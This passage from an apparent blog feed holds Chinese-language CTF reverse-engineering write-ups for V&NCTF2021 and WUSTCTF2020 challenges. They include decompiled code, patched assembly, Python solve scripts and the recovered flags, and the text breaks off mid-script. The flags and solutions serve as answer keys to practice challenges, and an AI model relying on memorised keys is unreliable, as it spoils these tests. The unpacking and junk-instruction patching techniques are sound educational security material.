class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;add&#x27;</span>, <span class="number">1</span>, [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]]], <span class="comment"># list_b 包含5个五元list</span></span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;crypt&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;initlist&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;basiccheck&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">-1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">1</span>, <span class="number">-1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">2</span>, <span class="number">-1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">3</span>, <span class="number">-1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">4</span>, <span class="number">-1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">2</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;check&#x27;</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;Goodjob!&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;The flag is vnctf&#123;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="string">&#x27;exit&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>]]</span><br><span class="line">object_a.run()</span><br></pre></td></tr></table></figure><p>不太懂python的注解，这里好像是通过给定的字符串调用相应的函数？</p><p>整体就是一个五阶幻方，最后使用hashlib里的md5算一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hashlib.new(<span class="string">&#x27;md5&#x27;</span>, <span class="built_in">bytes</span>((<span class="string">&#x27;02433420112112034430403122130414004132233324100142&#x27;</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line"><span class="string">&#x27;e3a912c1e911ad82544af0c3d753f44f&#x27;</span></span><br></pre></td></tr></table></figure><p>套上 <code>vnctf&#123;&#125;</code> 即可</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;V&amp;amp;NCTF2021补题 第一篇&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020 re writeups</title>
    <link href="https://s0uthwood.github.io/2021/03/07/WUSTCTF2020-re-writeups/"/>
    <id>https://s0uthwood.github.io/2021/03/07/WUSTCTF2020-re-writeups/</id>
    <published>2021-03-07T13:35:10.000Z</published>
    <updated>2021-05-19T17:47:15.348Z</updated>
    
    <content type="html"><![CDATA[<p>平台：BUUOJ</p><a id="more"></a><h1 id="Crossfun"><a href="#Crossfun" class="headerlink" title="Crossfun"></a>Crossfun</h1><p>拖入ida，发现有个判断函数，里面对输入的每个字符进行了判断，把所有判断函数整合起来，就得到flag了</p><p>flag: <code>wctf2020&#123;cpp_@nd_r3verse_@re_fun&#125;</code></p><h1 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h1><p>拖入ida</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">stream = fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(ptr, <span class="number">1u</span>LL, <span class="number">0x14</span>uLL, stream);</span><br><span class="line">fclose(stream);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">19</span>; ++i ) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &amp; <span class="number">1</span> )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(ptr[i] &lt;&lt; i));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i * ptr[i]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然 <code>ptr</code> 里面就是flag</p><p>看到 output.txt 里面正好有19行</p><p>对其进行逆变换（注意0）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptr = [<span class="number">0</span>, <span class="number">198</span>, <span class="number">232</span>, <span class="number">816</span>, <span class="number">200</span>, <span class="number">1536</span>, <span class="number">300</span>, <span class="number">6144</span>, <span class="number">984</span>, <span class="number">51200</span>, <span class="number">570</span>, <span class="number">92160</span>, <span class="number">1200</span>, <span class="number">565248</span>, <span class="number">756</span>, <span class="number">1474560</span>, <span class="number">800</span>, <span class="number">6291456</span>, <span class="number">1782</span>, <span class="number">65536000</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(ptr[i] &gt;&gt; i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(ptr[i] // i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><p>得到flag <code>ctf2020&#123;d9-dE6-20c&#125;</code></p><h1 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h1><p>先使用upx进行脱壳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx -d attachment</span><br></pre></td></tr></table></figure><p>进入main函数</p><p>还没来得及按 <code>tab</code> 前就看到了flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 14h</span><br><span class="line">mov     [ebp+var_C], offset flag ; &quot;wctf2020&#123;Just_upx_-d&#125;&quot;</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset aWhereIsIt ; &quot;where is it?&quot;</span><br><span class="line">call    puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 804887C</span><br></pre></td></tr></table></figure><p>这件事情告诉我们还是要看汇编代码的</p><p><code>flag&#123;Just_upx_-d&#125;</code></p><h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>首先尝试运行程序，发现是一个base64编码程序</p><p>进行测试后看到程序中输出一个字符串 <code>Is there something wrong?</code></p><p>推测这个base64可能不正确</p><p>使用在线工具测试后发现大写字母出现错误</p><p>查看base64_table字符串，发现没有问题，说明源代码中有对字符串进行操作的部分</p><p>查看源代码，发现一个函数是 <code>O_OLootAtYou</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i ) &#123;</span><br><span class="line">    v0 = base64_table[i];</span><br><span class="line">    base64_table[i] = base64_table[<span class="number">19</span> - i];</span><br><span class="line">    result = <span class="number">19</span> - i;</span><br><span class="line">    base64_table[result] = v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数中说有一个奇怪的字符串，显然是用错误的加密得到的结果</p><p>对其进行更正后解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    table.append(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    c = table[i]</span><br><span class="line">    table[i] = table[<span class="number">19</span> - i]</span><br><span class="line">    table[<span class="number">19</span> - i] = c</span><br><span class="line"></span><br><span class="line">crypto = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line">msg = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crypto)):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(crypto[i]) &gt;= <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">and</span> <span class="built_in">ord</span>(crypto[i]) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            <span class="keyword">if</span> table[j] == crypto[i]:</span><br><span class="line">                msg += <span class="built_in">chr</span>(j + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg += crypto[i]</span><br><span class="line"><span class="built_in">print</span> (msg)</span><br><span class="line"><span class="built_in">print</span> (base64.b64decode(msg))</span><br></pre></td></tr></table></figure><p>运行得到flag为 <code>wctf2020&#123;Base64_is_the_start_of_reverse&#125;</code></p><h1 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h1><p>运行一下程序，发现这道题和结构体有关</p><p>拖入ida</p><p>看到主函数中输出的是type1和type2函数的结果</p><p>查看type1和type2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 ) &#123;</span><br><span class="line">    type1(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">putchar</span>(*a1);</span><br><span class="line">    result = type1(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 ) &#123;</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">1</span>));</span><br><span class="line">    type2(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">    result = <span class="built_in">putchar</span>(*a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>明显是二叉树的中序遍历和后序遍历</p><p>反推出前序遍历，得到flag: <code>wctf2020&#123;This_IS_A_7reE&#125;</code></p><h1 id="funnyre"><a href="#funnyre" class="headerlink" title="funnyre"></a>funnyre</h1><p>拖入ida后，通过start函数进入main</p><p>发现main函数未定义，按p创建函数后F5，查看代码</p><p>看到一串如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v7 = <span class="number">0L</span>L;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  *(_BYTE *)(v6 + v7++ + <span class="number">5</span>) ^= <span class="number">0x91</span>u;       <span class="comment">// 每一项异或0x91</span></span><br><span class="line"><span class="keyword">while</span> ( v7 != <span class="number">32</span> );</span><br></pre></td></tr></table></figure><p>除此之外，还有一些错误代码标红</p><p>以及JUMPOUT函数</p><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">JUMPOUT(<span class="number">1</span>, (<span class="keyword">char</span> *)&amp;loc_400B81 + <span class="number">1</span>);</span><br><span class="line">JUMPOUT(<span class="number">0</span>, (<span class="keyword">char</span> *)&amp;loc_400B81 + <span class="number">1</span>);</span><br><span class="line">v89 = MEMORY[<span class="number">0xFFFFFFFF81003D16</span>](v6);</span><br><span class="line">JUMPOUT(v91, (<span class="keyword">char</span> *)&amp;loc_400B88 + <span class="number">2</span>);</span><br><span class="line">*(_DWORD *)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v89 - <span class="number">1065138106</span>) - <span class="number">125L</span>L) += v92;</span><br><span class="line">*(_BYTE *)(a3 - <span class="number">15</span>) &amp;= BYTE1(v90);</span><br></pre></td></tr></table></figure><p>经过学习后发现JUMPOUT函数是经典花指令，需要patch去除</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400607 loc_400607:                             ; CODE XREF: main+64↓j</span><br><span class="line">.text:0000000000400607                 xor     byte ptr [rdx+rax+5], 91h</span><br><span class="line">.text:000000000040060C                 add     rax, 1</span><br><span class="line">.text:0000000000400610                 cmp     rax, 20h</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400607</span><br><span class="line">.text:0000000000400616                 jz      short near ptr loc_40061A+1</span><br><span class="line">.text:0000000000400618                 jnz     short near ptr loc_40061A+1</span><br><span class="line">.text:000000000040061A</span><br><span class="line">.text:000000000040061A loc_40061A:                             ; CODE XREF: main+66↑j</span><br><span class="line">.text:000000000040061A                                         ; main+68↑j</span><br><span class="line">.text:000000000040061A                 call    near ptr 0FFFFFFFF810037AFh</span><br><span class="line">.text:000000000040061F                 jz      short near ptr loc_400621+2</span><br><span class="line">.text:0000000000400621</span><br></pre></td></tr></table></figure><p>发现40061A这个位置其实被跳过了</p><p>将这个位置的数据变为90（即nop）</p><p><img data-src="patch.png" alt="patch"></p><p>按c将其转换回汇编代码</p><p>得到正确代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400616                 jz      short loc_40061B</span><br><span class="line">.text:0000000000400618                 jnz     short loc_40061B</span><br><span class="line">.text:000000000040061A                 nop</span><br><span class="line">.text:000000000040061B</span><br><span class="line">.text:000000000040061B loc_40061B:                             ; CODE XREF: main+66↑j</span><br><span class="line">.text:000000000040061B                                         ; main+68↑j</span><br><span class="line">.text:000000000040061B                 nop</span><br><span class="line">.text:000000000040061C                 xor     eax, eax</span><br><span class="line">.text:000000000040061E</span><br><span class="line">.text:000000000040061E loc_40061E:                             ; CODE XREF: main+7B↓j</span><br><span class="line">.text:000000000040061E                 xor     byte ptr [rdx+rax+5], 0CDh</span><br><span class="line">.text:0000000000400623                 add     rax, 1</span><br><span class="line">.text:0000000000400627                 cmp     rax, 20h</span><br><span class="line">.text:000000000040062B                 jnz     short loc_40061E</span><br><span class="line">.text:000000000040062D                 xor     eax, eax</span><br><span class="line">.text:000000000040062F</span><br></pre></td></tr></table></figure><p>在ida汇编模式中将后面几个标红的部分进行同样的修改，随后再F5即可查看到正确的代码</p><p>找到函数结尾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">memcmp</span>(v5 + <span class="number">5</span>, &amp;unk_4025C0, <span class="number">0x20</span>uLL) )</span><br><span class="line">      JUMPOUT(&amp;loc_4005BB);</span><br></pre></td></tr></table></figure><p>发现unk字符串，将其进行如上函数的逆变换，即可得到最终结果</p><p>我选择的方法是复制到vscode然后利用快捷键进行快速复制，最终得到答案</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">res = [<span class="number">0xD9</span>, <span class="number">0x2C</span>, <span class="number">0x27</span>, <span class="number">0xD6</span>, <span class="number">0xD8</span>, <span class="number">0x2A</span>, <span class="number">0xDA</span>, <span class="number">0x2D</span>, <span class="number">0xD7</span>, <span class="number">0x2C</span>, <span class="number">0xDC</span>, <span class="number">0xE1</span>, <span class="number">0xDB</span>, <span class="number">0x2C</span>, <span class="number">0xD9</span>, <span class="number">0xDD</span>, <span class="number">0x27</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0xDC</span>, <span class="number">0xDB</span>, <span class="number">0x2C</span>, <span class="number">0xE1</span>, <span class="number">0x29</span>, <span class="number">0xDA</span>, <span class="number">0xDA</span>, <span class="number">0x2C</span>, <span class="number">0xDA</span>, <span class="number">0x2A</span>, <span class="number">0xD9</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>]</span><br><span class="line">add = [<span class="number">80</span>, <span class="number">64</span>, <span class="number">79</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">99</span>, <span class="number">87</span>, <span class="number">83</span>, <span class="number">59</span>, <span class="number">58</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">57</span>, <span class="number">65</span>, <span class="number">53</span>, <span class="number">41</span>, <span class="number">85</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">70</span>, <span class="number">12</span>, <span class="number">84</span>, <span class="number">10</span>, <span class="number">74</span>, <span class="number">17</span>, <span class="number">38</span>, <span class="number">43</span>, <span class="number">33</span>, <span class="number">11</span>, <span class="number">94</span>, <span class="number">86</span>, <span class="number">55</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">68</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">71</span>, <span class="number">96</span>, <span class="number">56</span>, <span class="number">6</span>, <span class="number">73</span>, <span class="number">52</span>, <span class="number">42</span>, <span class="number">61</span>, <span class="number">69</span>, <span class="number">14</span>, <span class="number">75</span>, <span class="number">4</span>, <span class="number">40</span>, <span class="number">37</span>, <span class="number">15</span>, <span class="number">77</span>, <span class="number">2</span>, <span class="number">23</span>, <span class="number">62</span>, <span class="number">29</span>, <span class="number">49</span>, <span class="number">47</span>, <span class="number">27</span>, <span class="number">66</span>, <span class="number">82</span>, <span class="number">46</span>, <span class="number">19</span>, <span class="number">88</span>, <span class="number">63</span>, <span class="number">39</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">92</span>, <span class="number">95</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">48</span>, <span class="number">36</span>, <span class="number">93</span>, <span class="number">76</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">13</span>, <span class="number">45</span>, <span class="number">34</span>, <span class="number">78</span>, <span class="number">26</span>, <span class="number">54</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">60</span>, <span class="number">21</span>, <span class="number">8</span>]</span><br><span class="line">xor1 = [<span class="number">0xF9</span>, <span class="number">0xA9</span>, <span class="number">0x4E</span>, <span class="number">0xD3</span>, <span class="number">0xC7</span>, <span class="number">0xE2</span>, <span class="number">0xD2</span>, <span class="number">0x33</span>, <span class="number">0xA8</span>, <span class="number">0x96</span>, <span class="number">0xBD</span>, <span class="number">0xC</span>, <span class="number">0x13</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x9C</span>, <span class="number">0x12</span>, <span class="number">2</span>, <span class="number">0x32</span>, <span class="number">0x10</span>, <span class="number">0x84</span>, <span class="number">0xED</span>, <span class="number">0x95</span>, <span class="number">0x4D</span>, <span class="number">0x75</span>, <span class="number">0x2C</span>, <span class="number">0x5D</span>, <span class="number">0x39</span>, <span class="number">0x18</span>, <span class="number">0x4C</span>, <span class="number">0x49</span>, <span class="number">0x37</span>, <span class="number">0xF0</span>, <span class="number">0x99</span>, <span class="number">0x41</span>, <span class="number">0x86</span>, <span class="number">0x76</span>, <span class="number">0xF5</span>, <span class="number">5</span>, <span class="number">0xC8</span>, <span class="number">0x64</span>, <span class="number">0xFA</span>, <span class="number">0x50</span>, <span class="number">0x3B</span>, <span class="number">8</span>, <span class="number">0xE9</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0xff</span>, <span class="number">0x7D</span>, <span class="number">0x9D</span>, <span class="number">0x1D</span>, <span class="number">0xDA</span>, <span class="number">0xD8</span>, <span class="number">0xEB</span>, <span class="number">0xF6</span>, <span class="number">0xE3</span>, <span class="number">0x98</span>, <span class="number">0xE1</span>, <span class="number">0x34</span>, <span class="number">0x82</span>, <span class="number">0x7F</span>, <span class="number">0xD5</span>, <span class="number">0xE7</span>, <span class="number">0xB8</span>, <span class="number">0xDC</span>, <span class="number">0x97</span>, <span class="number">0xA3</span>, <span class="number">7</span>, <span class="number">0xB6</span>, <span class="number">0xB</span>, <span class="number">0x14</span>, <span class="number">0xCE</span>, <span class="number">0x66</span>, <span class="number">0x62</span>, <span class="number">0xEF</span>]</span><br><span class="line"><span class="comment"># 中间有一个0xff，对应这取反的那个循环</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> add:</span><br><span class="line">        res[i] -= j</span><br><span class="line">        res[i] %= <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xor1:</span><br><span class="line">        res[i] ^= j</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    res[i] += <span class="number">128</span></span><br><span class="line">    res[i] %= <span class="number">256</span></span><br><span class="line"></span><br><span class="line">xor2 = [<span class="number">0x91</span>, <span class="number">0xCD</span>, <span class="number">0x6A</span>, <span class="number">0x59</span>, <span class="number">0xA</span>, <span class="number">0xF3</span>, <span class="number">0xCA</span>, <span class="number">0x3E</span>, <span class="number">0x6C</span>, <span class="number">0x4F</span>, <span class="number">0x24</span>, <span class="number">0x83</span>, <span class="number">0xC4</span>, <span class="number">0x53</span>, <span class="number">4</span>, <span class="number">0x9E</span>, <span class="number">0x42</span>, <span class="number">0xE</span>, <span class="number">0x8D</span>, <span class="number">0x38</span>, <span class="number">0x7A</span>, <span class="number">0xDD</span>, <span class="number">0x52</span>, <span class="number">0x1B</span>, <span class="number">0xAA</span>, <span class="number">0xAE</span>, <span class="number">0xF8</span>, <span class="number">0x58</span>, <span class="number">0xF2</span>, <span class="number">0x9F</span>, <span class="number">0x3C</span>, <span class="number">0xA1</span>, <span class="number">6</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x28</span>, <span class="number">0xEA</span>, <span class="number">0x48</span>, <span class="number">0xE4</span>, <span class="number">0x6E</span>, <span class="number">0x40</span>, <span class="number">0x89</span>, <span class="number">0x16</span>, <span class="number">0xD7</span>, <span class="number">0xB5</span>, <span class="number">0xD</span>, <span class="number">0x17</span>, <span class="number">0x5A</span>, <span class="number">0xB1</span>, <span class="number">0x69</span>, <span class="number">0x5C</span>, <span class="number">0x21</span>, <span class="number">0xE5</span>, <span class="number">0x7E</span>, <span class="number">0x2A</span>, <span class="number">0x94</span>, <span class="number">0xBC</span>, <span class="number">1</span>, <span class="number">0x74</span>, <span class="number">0x57</span>, <span class="number">0x6D</span>, <span class="number">0x1E</span>, <span class="number">0xA2</span>, <span class="number">0x6B</span>, <span class="number">0x22</span>, <span class="number">0xC2</span>, <span class="number">0x3D</span>, <span class="number">0x44</span>, <span class="number">0x90</span>, <span class="number">0x8C</span>, <span class="number">0xB3</span>, <span class="number">0xA6</span>, <span class="number">0x79</span>, <span class="number">0x61</span>, <span class="number">0xD9</span>, <span class="number">0x5B</span>, <span class="number">0x1A</span>, <span class="number">0x43</span>, <span class="number">0x8F</span>, <span class="number">0xA5</span>, <span class="number">0xEE</span>, <span class="number">0x25</span>, <span class="number">0x46</span>, <span class="number">0xE6</span>, <span class="number">0x88</span>, <span class="number">0x20</span>, <span class="number">0x71</span>, <span class="number">0xE8</span>, <span class="number">9</span>, <span class="number">0x8A</span>, <span class="number">0x7B</span>, <span class="number">0xB4</span>, <span class="number">0x19</span>, <span class="number">0x15</span>, <span class="number">0x4A</span>, <span class="number">0x47</span>, <span class="number">0xDB</span>, <span class="number">0x72</span>, <span class="number">0x5F</span>, <span class="number">0x26</span>, <span class="number">0xA7</span>, <span class="number">0x8B</span>, <span class="number">0xBA</span>, <span class="number">0xBF</span>, <span class="number">0x87</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xFE</span>, <span class="number">0x77</span>, <span 